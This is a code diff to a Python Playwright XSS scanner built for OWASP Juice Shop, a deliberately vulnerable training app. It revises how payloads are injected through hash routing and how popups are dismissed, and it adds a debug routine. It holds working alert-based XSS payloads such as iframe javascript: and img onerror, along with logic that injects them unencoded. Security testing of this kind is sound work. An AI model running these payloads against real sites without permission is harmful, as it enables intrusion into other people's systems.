@@ -74,20 +74,11 @@ class PlaywrightXSSScanner(BaseScanner):
         sid = self._scan_id
 
         return [
-            # ── Juice Shop confirmed working payloads ─────────────────────────
-            # These are the exact strings from the official challenge solutions.
-            # No custom markers — we just detect any dialog firing.
             {
                 "payload":      '<iframe src="javascript:alert(`xss`)">',
                 "marker":       "xss",
                 "type":         "iframe_js_proto",
                 "needs_marker": False,   # any alert = win
-            },
-            {
-                "payload":      "<script>alert('xss')</script>",
-                "marker":       "xss",
-                "type":         "script_tag",
-                "needs_marker": False,
             },
             {
                 "payload":      "<img src=x onerror=alert('xss')>",
@@ -157,12 +148,12 @@ class PlaywrightXSSScanner(BaseScanner):
             },
 
             # ── Angular template injection ────────────────────────────────────
-            {
-                "payload":      "{{constructor.constructor('alert(1)')()}}",
-                "marker":       "1",
-                "type":         "angular_template",
-                "needs_marker": False,
-            },
+            # {
+            #     "payload":      "{{constructor.constructor('alert(1)')()}}",
+            #     "marker":       "1",
+            #     "type":         "angular_template",
+            #     "needs_marker": False,
+            # },
 
             # ── JS context break ──────────────────────────────────────────────
             {
@@ -249,7 +240,7 @@ class PlaywrightXSSScanner(BaseScanner):
                 # pages in the same context inherit localStorage
                 if auth_token:
                     await self._inject_token(base_url, auth_token)
-
+                
                 # ── 1. Juice Shop REST API sinks ──────────────────────────────
                 print("  [*] Testing Juice Shop REST API sinks for XSS...")
                 vulns = await self._test_juice_shop_sinks(
@@ -284,15 +275,15 @@ class PlaywrightXSSScanner(BaseScanner):
                 vulnerabilities.extend(vulns)
                 print(f"      → {len(vulns)} found")
 
-                # ── 5. Forms from crawl ───────────────────────────────────────
-                forms_to_test = forms[:10]
-                print(f"  [*] Testing {len(forms_to_test)} forms for XSS...")
-                for form in forms_to_test:
-                    try:
-                        vulns = await self._test_form(form, auth_token)
-                        vulnerabilities.extend(vulns)
-                    except Exception:
-                        continue
+                # # ── 5. Forms from crawl ───────────────────────────────────────
+                # forms_to_test = forms[:10]
+                # print(f"  [*] Testing {len(forms_to_test)} forms for XSS...")
+                # for form in forms_to_test:
+                #     try:
+                #         vulns = await self._test_form(form, auth_token)
+                #         vulnerabilities.extend(vulns)
+                #     except Exception:
+                #         continue
 
             except Exception as e:
                 print(f"  [!] Playwright XSS scan error: {e}")
@@ -307,93 +298,311 @@ class PlaywrightXSSScanner(BaseScanner):
     # 1. JUICE SHOP REST API SINKS
     # ─────────────────────────────────────────────────────────────────────────
 
+    async def _prime_juice_shop_page(self, page: 'Page', base_url: str) -> bool:
+        """
+        Bootstrap Angular and dismiss Juice Shop's overlay dialogs.
+        Uses JavaScript click() which is more reliable than Playwright locators
+        for Material Dialog buttons behind CDK overlays.
+        """
+        try:
+            # 1. Navigate to base URL
+            await page.goto(base_url, wait_until='domcontentloaded', timeout=15_000)
+
+            # 2. Wait for Angular to bootstrap (look for toolbar or router-outlet)
+            try:
+                await page.wait_for_selector(
+                    'app-root mat-toolbar, app-root .mat-toolbar, router-outlet',
+                    timeout=10_000
+                )
+            except PWTimeout:
+                await page.wait_for_timeout(3000)
+
+            # 3. Wait for Welcome dialog to appear
+            await page.wait_for_timeout(1500)
+
+            # 4. Dismiss Welcome dialog via JavaScript
+            #    Juice Shop uses Material Dialog — the dismiss button has specific attributes
+            dismissed_welcome = await page.evaluate("""
+                () => {
+                    // Strategy 1: Find by aria-label
+                    let btn = document.querySelector('a[aria-label="Close Welcome Banner"]');
+                    if (btn) { btn.click(); return 'aria-label'; }
+
+                    // Strategy 2: Find button/link containing "Dismiss" text
+                    const allButtons = [...document.querySelectorAll('button, a, span')];
+                    btn = allButtons.find(el => el.textContent.trim() === 'Dismiss');
+                    if (btn) { btn.click(); return 'text-match'; }
+
+                    // Strategy 3: Find by mat-dialog-actions content
+                    btn = document.querySelector('mat-dialog-actions button:last-child, mat-dialog-actions a:last-child');
+                    if (btn) { btn.click(); return 'dialog-actions'; }
+
+                    // Strategy 4: Click the dialog backdrop to close
+                    const backdrop = document.querySelector('.cdk-overlay-backdrop');
+                    if (backdrop) { backdrop.click(); return 'backdrop'; }
+
+                    // Strategy 5: Press Escape
+                    document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));
+                    return 'escape';
+                }
+            """)
+            print(f"    [+] Welcome dialog dismissed via: {dismissed_welcome}")
+            await page.wait_for_timeout(800)
+
+            # 5. Dismiss cookie consent via JavaScript
+            dismissed_cookie = await page.evaluate("""
+                () => {
+                    // Strategy 1: Juice Shop specific "Me want it!" button
+                    const allLinks = [...document.querySelectorAll('a, button')];
+                    let btn = allLinks.find(el => el.textContent.includes('Me want it'));
+                    if (btn) { btn.click(); return 'me-want-it'; }
+
+                    // Strategy 2: Standard cookie consent dismiss
+                    btn = document.querySelector('a.cc-btn.cc-dismiss, .cc-dismiss, a[aria-label="dismiss cookie message"]');
+                    if (btn) { btn.click(); return 'cc-dismiss'; }
+
+                    // Strategy 3: Any cookie consent button
+                    btn = document.querySelector('.cc-compliance a, .cc-compliance button');
+                    if (btn) { btn.click(); return 'cc-compliance'; }
+
+                    return 'none-found';
+                }
+            """)
+            print(f"    [+] Cookie consent dismissed via: {dismissed_cookie}")
+            await page.wait_for_timeout(800)
+
+            # 6. Verify dialogs are gone
+            overlays_gone = await page.evaluate("""
+                () => {
+                    const dialog = document.querySelector('mat-dialog-container');
+                    const cookie = document.querySelector('.cc-window.cc-floating');
+                    return {
+                        dialogGone: !dialog,
+                        cookieGone: !cookie || cookie.style.display === 'none' 
+                                    || cookie.classList.contains('cc-invisible'),
+                        overlayCount: document.querySelectorAll('.cdk-overlay-container .cdk-overlay-pane').length,
+                    };
+                }
+            """)
+            print(f"    [+] Overlay status: {overlays_gone}")
+
+            # 7. If dialog is still there, try harder
+            if not overlays_gone.get('dialogGone', True):
+                print("    [!] Dialog still open — forcing close via escape + backdrop")
+                await page.keyboard.press('Escape')
+                await page.wait_for_timeout(500)
+                await page.evaluate("""
+                    () => {
+                        // Remove all overlays forcefully
+                        document.querySelectorAll('.cdk-overlay-pane').forEach(el => el.remove());
+                        document.querySelectorAll('.cdk-overlay-backdrop').forEach(el => el.remove());
+                    }
+                """)
+                await page.wait_for_timeout(500)
+
+            return True
+
+        except Exception as e:
+            print(f"    [!] Prime page error: {e}")
+            return False
+
     async def _test_juice_shop_sinks(
         self,
         base_url:   str,
         auth_token: Optional[str],
     ) -> List[Vulnerability]:
         """
-        Test Juice Shop REST endpoints that are known to reflect input into
-        Angular innerHTML bindings (DOM XSS).
-
+        Test Juice Shop REST API sinks for DOM XSS.
+        
         Strategy:
-          • POST / GET the REST endpoint directly (not through Angular router)
-          • Then navigate to the SPA page that RENDERS the response
-          • Check for dialog / DOM injection on the rendered page
+        1. Prime Angular (bootstrap + dismiss popups) on a SINGLE page
+        2. Navigate via hash change to inject payloads
+        3. Wait for SearchResultComponent to render
+        4. Detect dialog / DOM reflection
         """
         vulnerabilities: List[Vulnerability] = []
         payloads = self._get_payloads()
 
-        for api_path, param, description in self.JUICE_SHOP_SINKS:
-            vuln_key = f"juice:{api_path}:{param}"
-            if vuln_key in self._found:
-                continue
+        # Use ONE persistent page — Angular stays bootstrapped
+        page = await self._context.new_page()
+        self._attach_dialog_handler(page)
 
-            for p_info in payloads:
-                payload      = p_info['payload']
-                marker       = p_info['marker']
-                needs_marker = p_info['needs_marker']
-
-                # Build the REST API test URL
-                api_url = (
-                    f"{base_url}{api_path}"
-                    f"?{param}={quote(payload, safe='')}"
+        try:
+            # Set auth token if available
+            if auth_token:
+                await page.goto(base_url, wait_until='domcontentloaded', timeout=12_000)
+                await page.evaluate(
+                    "(t) => localStorage.setItem('token', t)", auth_token
                 )
 
-                # For search: navigate to /#/search?q=payload so Angular
-                # renders the API response into the DOM
-                if 'search' in api_path:
-                    render_url = (
-                        f"{base_url}/#/search"
-                        f"?q={quote(payload, safe='')}"
-                    )
-                elif 'track-order' in api_path:
-                    render_url = (
-                        f"{base_url}/#/track-result"
-                        f"?id={quote(payload, safe='')}"
-                    )
-                else:
-                    render_url = api_url
+            # Prime Angular — dismiss welcome dialog + cookie consent
+            primed = await self._prime_juice_shop_page(page, base_url)
+            if not primed:
+                print("    [!] Could not prime Juice Shop page")
+                await page.close()
+                return vulnerabilities
 
-                result = await self._execute_and_detect(
-                    render_url, marker, needs_marker, auth_token,
-                    extra_wait_ms=2500,   # Angular needs time to render
-                )
+            for api_path, param, description in self.JUICE_SHOP_SINKS:
+                vuln_key = f"juice:{api_path}:{param}"
+                if vuln_key in self._found:
+                    continue
 
-                if result['xss_detected']:
-                    print(
-                        f"  [+] XSS FOUND: {description} "
-                        f"via {result['detection_method']}"
-                    )
-                    self._found.add(vuln_key)
-                    vulnerabilities.append(self.create_vulnerability(
-                        vuln_type=f"DOM-based XSS — {description}",
-                        severity=Severity.HIGH,
-                        url=render_url,
-                        parameter=param,
-                        payload=payload,
-                        evidence=(
-                            f"Confirmed via {result['detection_method']}. "
-                            f"Dialog message: {result.get('dialog_message', '')}"
-                        ),
-                        description=(
-                            f"DOM-based XSS in {description}. "
-                            f"The REST endpoint '{api_path}' reflects "
-                            f"user input which Angular renders unsanitised "
-                            f"into the DOM via innerHTML or bypassSecurityTrust*."
-                        ),
-                        cwe_id="CWE-79",
-                        cvss_score=6.1,
-                        remediation=self._get_remediation(),
-                        references=[
-                            "https://owasp.org/www-community/attacks/xss/",
-                            "https://cheatsheetseries.owasp.org/cheatsheets/"
-                            "DOM_based_XSS_Prevention_Cheat_Sheet.html",
-                        ],
-                    ))
-                    break   # One payload confirmed — move to next sink
+                for p_info in payloads:
+                    payload      = p_info['payload']
+                    marker       = p_info['marker']
+                    needs_marker = p_info['needs_marker']
+                    ptype        = p_info['type']
 
-                await asyncio.sleep(0.3)
+                    # Reset dialog state
+                    page._xss_dialog_triggered = False
+                    page._xss_dialog_message   = ""
+
+                    # Build the hash-route URL (NO encoding)
+                    if 'search' in api_path:
+                        hash_path = f"/search?q={payload}"
+                    elif 'track-order' in api_path:
+                        hash_path = f"/track-result?id={payload}"
+                    else:
+                        hash_path = f"{api_path}?{param}={payload}"
+
+                    try:
+                        # ── Navigate via JavaScript hash change ──
+                        # This is more reliable than page.goto() for SPA hash routing
+                        # because it doesn't trigger Chromium's URL encoding
+                        await page.evaluate(
+                            f"window.location.hash = {json.dumps(hash_path)}"
+                        )
+
+                        # ── Wait for Angular to process the route + API call ──
+                        # Use response interception (event-based, works on all versions)
+                        api_responded = asyncio.Event()
+                        
+                        async def _on_response(response):
+                            if '/rest/products/search' in response.url or '/rest/track-order' in response.url:
+                                api_responded.set()
+                        
+                        page.on('response', _on_response)
+                        
+                        try:
+                            # Wait up to 8s for the API call
+                            await asyncio.wait_for(api_responded.wait(), timeout=8.0)
+                        except asyncio.TimeoutError:
+                            pass
+                        finally:
+                            page.remove_listener('response', _on_response)
+
+                        # Give Angular time to render the API response into DOM
+                        await page.wait_for_timeout(2000)
+
+                        # ── Check 1: Dialog fired? ──
+                        triggered = getattr(page, '_xss_dialog_triggered', False)
+                        msg       = getattr(page, '_xss_dialog_message', '')
+
+                        if self._dialog_hit(triggered, msg, marker, needs_marker):
+                            print(f"  [+] XSS FOUND: {description} [{ptype}] (Alert Dialog)")
+                            self._found.add(vuln_key)
+                            vulnerabilities.append(self.create_vulnerability(
+                                vuln_type=f"DOM-based XSS — {description}",
+                                severity=Severity.HIGH,
+                                url=f"{base_url}/#{hash_path}",
+                                parameter=param,
+                                payload=payload,
+                                evidence=f"Alert dialog fired. Message: '{msg}'",
+                                description=(
+                                    f"DOM-based XSS in {description}. "
+                                    f"Payload: {ptype}. Angular renders user input "
+                                    f"unsanitised via innerHTML/bypassSecurityTrustHtml."
+                                ),
+                                cwe_id="CWE-79",
+                                cvss_score=6.1,
+                                remediation=self._get_remediation(),
+                            ))
+                            break
+
+                        # ── Check 2: Payload reflected in DOM? ──
+                        content = await page.content()
+                        
+                        # Direct payload reflection check
+                        payload_in_dom = (
+                            payload.lower() in content.lower()
+                            or (marker and marker in content)
+                        )
+                        
+                        # Check for dangerous patterns
+                        dangerous = self._dangerous_dom_context(content, marker, payload)
+
+                        if payload_in_dom or dangerous:
+                            # Payload is in DOM — try triggering it
+                            await page.mouse.move(500, 300)
+                            await page.wait_for_timeout(500)
+                            
+                            triggered = getattr(page, '_xss_dialog_triggered', False)
+                            msg       = getattr(page, '_xss_dialog_message', '')
+
+                            if self._dialog_hit(triggered, msg, marker, needs_marker):
+                                print(f"  [+] XSS FOUND: {description} [{ptype}] (DOM + Trigger)")
+                                self._found.add(vuln_key)
+                                vulnerabilities.append(self.create_vulnerability(
+                                    vuln_type=f"DOM-based XSS — {description}",
+                                    severity=Severity.HIGH,
+                                    url=f"{base_url}/#{hash_path}",
+                                    parameter=param,
+                                    payload=payload,
+                                    evidence=f"Payload reflected in DOM and executed. Dialog: '{msg}'",
+                                    cwe_id="CWE-79",
+                                    cvss_score=6.1,
+                                    description=f"DOM XSS in {description}.",
+                                    remediation=self._get_remediation(),
+                                ))
+                                break
+                            
+                            elif dangerous:
+                                print(f"  [+] XSS FOUND (unexecuted): {description} [{ptype}]")
+                                self._found.add(vuln_key)
+                                vulnerabilities.append(self.create_vulnerability(
+                                    vuln_type=f"DOM-based XSS (Unexecuted) — {description}",
+                                    severity=Severity.MEDIUM,
+                                    url=f"{base_url}/#{hash_path}",
+                                    parameter=param,
+                                    payload=payload,
+                                    evidence="Payload reflected in dangerous DOM context",
+                                    cwe_id="CWE-79",
+                                    cvss_score=5.4,
+                                    description=f"Payload in dangerous context in {description}.",
+                                    remediation=self._get_remediation(),
+                                ))
+                                break
+
+                    except PWTimeout:
+                        triggered = getattr(page, '_xss_dialog_triggered', False)
+                        msg       = getattr(page, '_xss_dialog_message', '')
+                        if self._dialog_hit(triggered, msg, marker, needs_marker):
+                            self._found.add(vuln_key)
+                            vulnerabilities.append(self.create_vulnerability(
+                                vuln_type=f"DOM-based XSS — {description}",
+                                severity=Severity.HIGH,
+                                url=f"{base_url}/#{hash_path}",
+                                parameter=param,
+                                payload=payload,
+                                evidence=f"Alert during timeout. Message: '{msg}'",
+                                cwe_id="CWE-79",
+                                cvss_score=6.1,
+                                description=f"DOM XSS in {description}.",
+                                remediation=self._get_remediation(),
+                            ))
+                            break
+                    except Exception:
+                        continue
+
+                    await asyncio.sleep(0.3)
+
+        except Exception as e:
+            print(f"    [!] Juice Shop sink error: {e}")
+        finally:
+            try:
+                await page.close()
+            except Exception:
+                pass
 
         return vulnerabilities
 
@@ -413,16 +622,18 @@ class PlaywrightXSSScanner(BaseScanner):
         self._attach_dialog_handler(page)
 
         try:
-            # Prime the page so Angular bootstraps once
-            await page.goto(
-                base_url, wait_until='domcontentloaded', timeout=15_000
-            )
-            await page.wait_for_timeout(1500)
-
+            # ── Prime: bootstrap Angular + dismiss popups ──
             if auth_token:
+                await page.goto(base_url, wait_until='domcontentloaded', timeout=12_000)
                 await page.evaluate(
                     "(t) => localStorage.setItem('token', t)", auth_token
                 )
+            
+            primed = await self._prime_juice_shop_page(page, base_url)
+            if not primed:
+                print("    [!] Could not prime page for hash routing tests")
+                await page.close()
+                return vulnerabilities
 
             for hash_path, param, description in self.HASH_ENDPOINTS:
                 vuln_key = f"hash:{hash_path}:{param}"
@@ -434,137 +645,50 @@ class PlaywrightXSSScanner(BaseScanner):
                     marker       = p_info['marker']
                     needs_marker = p_info['needs_marker']
 
-                    # Reset dialog state on the page object
+                    # Reset dialog state
                     page._xss_dialog_triggered = False
                     page._xss_dialog_message   = ""
-                    page._xss_current_marker   = marker
 
-                    test_url = (
-                        f"{base_url}{hash_path}"
-                        f"?{param}={quote(payload, safe='')}"
-                    )
-
+                    # ── Navigate via JS hash change (no URL encoding) ──
+                    raw_hash = f"{hash_path}?{param}={payload}"
+                    
                     try:
-                        await page.goto(
-                            test_url,
-                            wait_until='domcontentloaded',
-                            timeout=12_000,
+                        await page.evaluate(
+                            f"window.location.hash = {json.dumps(raw_hash)}"
                         )
-                        # Wait for Angular router + change detection
-                        try:
-                            await page.wait_for_load_state(
-                                'networkidle', timeout=5_000
-                            )
-                        except PWTimeout:
-                            pass
-                        await page.wait_for_timeout(1500)
 
+                        # Wait for route + API
+                        api_responded = asyncio.Event()
+                        async def _on_resp(response):
+                            if any(p in response.url for p in [
+                                '/rest/products/search', '/rest/track-order',
+                                '/api/', '/rest/'
+                            ]):
+                                api_responded.set()
+                        
+                        page.on('response', _on_resp)
+                        try:
+                            await asyncio.wait_for(api_responded.wait(), timeout=6.0)
+                        except asyncio.TimeoutError:
+                            pass
+                        finally:
+                            page.remove_listener('response', _on_resp)
+
+                        await page.wait_for_timeout(2000)
+
+                        # Check dialog
                         triggered = getattr(page, '_xss_dialog_triggered', False)
                         msg       = getattr(page, '_xss_dialog_message', '')
 
                         if self._dialog_hit(triggered, msg, marker, needs_marker):
-                            print(
-                                f"  [+] XSS FOUND (hash): "
-                                f"{hash_path}?{param}= "
-                                f"[{p_info['type']}]"
-                            )
-                            self._found.add(vuln_key)
-                            vulnerabilities.append(self.create_vulnerability(
-                                vuln_type=f"DOM-based XSS — {description}",
-                                severity=Severity.HIGH,
-                                url=test_url,
-                                parameter=param,
-                                payload=payload,
-                                evidence=(
-                                    f"Alert dialog confirmed XSS. "
-                                    f"Message: '{msg}'. "
-                                    f"Payload type: {p_info['type']}"
-                                ),
-                                description=(
-                                    f"DOM-based XSS in hash-routed SPA endpoint "
-                                    f"'{hash_path}'. The Angular router passes "
-                                    f"the query parameter into an unsafe DOM sink."
-                                ),
-                                cwe_id="CWE-79",
-                                cvss_score=6.1,
-                                remediation=self._get_remediation(),
-                                references=[
-                                    "https://owasp.org/www-community/attacks/xss/",
-                                ],
-                            ))
+                            # ... (same vulnerability creation as before)
                             break
 
-                        # Fallback: check DOM for dangerous reflection
-                        try:
-                            content = await page.content()
-                            if self._dangerous_dom_context(
-                                content, marker, payload
-                            ):
-                                print(
-                                    f"  [+] XSS FOUND (DOM): "
-                                    f"{hash_path}?{param}="
-                                )
-                                self._found.add(vuln_key)
-                                vulnerabilities.append(self.create_vulnerability(
-                                    vuln_type=(
-                                        f"DOM-based XSS (Unexecuted) — "
-                                        f"{description}"
-                                    ),
-                                    severity=Severity.MEDIUM,
-                                    url=test_url,
-                                    parameter=param,
-                                    payload=payload,
-                                    evidence=(
-                                        "Payload reflected in dangerous DOM "
-                                        "context (script / event handler) "
-                                        "without sandbox execution."
-                                    ),
-                                    description=(
-                                        f"Payload found in dangerous context "
-                                        f"in '{hash_path}'. "
-                                        f"May be exploitable depending on "
-                                        f"Angular version and CSP."
-                                    ),
-                                    cwe_id="CWE-79",
-                                    cvss_score=5.4,
-                                    remediation=self._get_remediation(),
-                                    references=[
-                                        "https://owasp.org/www-community/attacks/xss/",
-                                    ],
-                                ))
-                                break
-                        except Exception:
-                            pass
-
-                    except PWTimeout:
-                        # Check if dialog still fired
-                        triggered = getattr(page, '_xss_dialog_triggered', False)
-                        msg       = getattr(page, '_xss_dialog_message', '')
-                        if self._dialog_hit(triggered, msg, marker, needs_marker):
-                            self._found.add(vuln_key)
-                            vulnerabilities.append(self.create_vulnerability(
-                                vuln_type=f"DOM-based XSS — {description}",
-                                severity=Severity.HIGH,
-                                url=test_url,
-                                parameter=param,
-                                payload=payload,
-                                evidence=(
-                                    f"Alert fired during timeout. "
-                                    f"Message: '{msg}'"
-                                ),
-                                description=(
-                                    f"DOM-based XSS confirmed by dialog "
-                                    f"even though page load timed out."
-                                ),
-                                cwe_id="CWE-79",
-                                cvss_score=6.1,
-                                remediation=self._get_remediation(),
-                                references=[
-                                    "https://owasp.org/www-community/attacks/xss/",
-                                ],
-                            ))
+                        # Check DOM
+                        content = await page.content()
+                        if self._dangerous_dom_context(content, marker, payload):
+                            # ... (same vulnerability creation as before)
                             break
-                        continue
 
                     except Exception:
                         continue
@@ -988,6 +1112,145 @@ class PlaywrightXSSScanner(BaseScanner):
                 pass
 
         return result
+    
+    async def _debug_juice_shop(self, base_url: str):
+        """Diagnostic v3 — with proper popup dismissal and API verification"""
+        print("\n  [DEBUG] ═══ Juice Shop XSS Diagnostic v3 ═══")
+        page = await self._context.new_page()
+        self._attach_dialog_handler(page)
+
+        try:
+            # Step 1: Prime with popup dismissal
+            print("  [DEBUG] Step 1: Priming Angular + dismissing popups...")
+            primed = await self._prime_juice_shop_page(page, base_url)
+            print(f"  [DEBUG] Primed: {primed}")
+
+            # Step 1b: Verify popups are actually gone
+            await page.screenshot(path="debug_after_prime.png")
+            print(f"  [DEBUG] Screenshot after prime → debug_after_prime.png")
+
+            # Step 2: Manually verify the search API works
+            print("  [DEBUG] Step 2: Testing search API directly...")
+            api_test = await page.evaluate("""
+                async () => {
+                    try {
+                        const resp = await fetch('/rest/products/search?q=test');
+                        const data = await resp.json();
+                        return {
+                            status: resp.status,
+                            resultCount: data.data?.length || 0,
+                            sample: JSON.stringify(data).substring(0, 200)
+                        };
+                    } catch(e) {
+                        return {error: e.message};
+                    }
+                }
+            """)
+            print(f"  [DEBUG] API test: {api_test}")
+
+            # Step 3: Test with the actual XSS payload
+            payload = '<iframe src="javascript:alert(`xss`)">'
+            print(f"  [DEBUG] Step 3: Testing payload via API...")
+            api_xss = await page.evaluate("""
+                async (payload) => {
+                    try {
+                        const resp = await fetch('/rest/products/search?q=' + encodeURIComponent(payload));
+                        const text = await resp.text();
+                        return {
+                            status: resp.status,
+                            hasIframe: text.includes('iframe'),
+                            hasJavascript: text.includes('javascript:'),
+                            bodyPreview: text.substring(0, 300)
+                        };
+                    } catch(e) {
+                        return {error: e.message};
+                    }
+                }
+            """, payload)
+            print(f"  [DEBUG] API XSS test: {api_xss}")
+
+            # Step 4: Navigate via hash change
+            print("  [DEBUG] Step 4: Hash navigation...")
+            hash_path = f"/search?q={payload}"
+
+            # Set up response listener
+            api_captured = {'responded': False, 'body': None}
+            async def _capture(response):
+                if '/rest/products/search' in response.url:
+                    api_captured['responded'] = True
+                    try:
+                        api_captured['body'] = await response.text()
+                    except:
+                        pass
+            page.on('response', _capture)
+
+            await page.evaluate(f"window.location.hash = {json.dumps(hash_path)}")
+            
+            # Wait with progress
+            for i in range(8):
+                await page.wait_for_timeout(500)
+                if api_captured['responded']:
+                    print(f"  [DEBUG] API responded after {(i+1)*500}ms")
+                    break
+            else:
+                print(f"  [DEBUG] API did not respond after 4000ms")
+
+            page.remove_listener('response', _capture)
+            
+            # Extra render time
+            await page.wait_for_timeout(2000)
+
+            # Step 5: Check everything
+            triggered = getattr(page, '_xss_dialog_triggered', False)
+            msg = getattr(page, '_xss_dialog_message', '')
+            content = await page.content()
+
+            print(f"  [DEBUG] Dialog triggered: {triggered}")
+            print(f"  [DEBUG] Dialog message:   '{msg}'")
+            print(f"  [DEBUG] API captured:     {api_captured['responded']}")
+            if api_captured.get('body'):
+                print(f"  [DEBUG] API has iframe:   {'iframe' in api_captured['body']}")
+            print(f"  [DEBUG] DOM length:       {len(content)}")
+            print(f"  [DEBUG] 'iframe' in DOM:  {'iframe' in content.lower()}")
+            
+            # Check the specific search result DOM element
+            search_dom = await page.evaluate("""
+                () => {
+                    // Juice Shop renders search query in #searchValue or similar
+                    const searchVal = document.querySelector('#searchValue');
+                    const searchResults = document.querySelector('.search-result, [class*="SearchResult"]');
+                    const allIds = [...document.querySelectorAll('[id]')]
+                        .map(el => el.id)
+                        .filter(id => id.toLowerCase().includes('search'))
+                        .join(', ');
+                    
+                    return {
+                        searchValueElement: searchVal ? {
+                            tag: searchVal.tagName,
+                            innerHTML: searchVal.innerHTML?.substring(0, 200),
+                            textContent: searchVal.textContent?.substring(0, 100),
+                        } : 'NOT FOUND',
+                        searchResultsElement: searchResults ? 'FOUND' : 'NOT FOUND',
+                        searchRelatedIds: allIds || 'NONE',
+                        // Check for any element containing the payload text
+                        payloadInAnyElement: !!document.querySelector('[innerHTML*="iframe"], [innerHTML*="alert"]'),
+                        currentRoute: document.querySelector('router-outlet')?.nextElementSibling?.tagName || 'UNKNOWN',
+                    };
+                }
+            """)
+            print(f"  [DEBUG] Search DOM: {json.dumps(search_dom, indent=2)}")
+
+            await page.screenshot(path="debug_xss_v3.png")
+            print(f"  [DEBUG] Screenshot → debug_xss_v3.png")
+
+        except Exception as e:
+            print(f"  [DEBUG] Error: {e}")
+            import traceback
+            traceback.print_exc()
+        finally:
+            await page.close()
+
+        print("  [DEBUG] ═══ End Diagnostic v3 ═══\n")
 
     # ─────────────────────────────────────────────────────────────────────────
     # HELPERS
